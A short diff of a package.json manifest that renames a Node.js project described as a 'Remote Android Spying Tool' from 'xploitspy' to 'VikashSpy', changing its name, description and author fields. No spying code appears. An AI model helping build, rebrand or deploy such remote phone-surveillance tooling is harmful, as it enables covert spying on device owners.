@@ -1,12 +1,12 @@
 {
-  "name": "xploitspy",
+  "name": "VikashSpy",
     "version": "1.0.0",
-    "description": "XploitSPY - Remote Android Spying Tool",
+    "description": "VikashSpy - Remote Android Spying Tool",
     "main": "index.js",
     "scripts": {
         "start": "node index.js",
         "test": "node index.js"},
-  "author": "XploitWizer",
+  "author": "VikashSpy",
     "license": "ISC",
     "dependencies": {
         "body-parser": "^1.19.0",
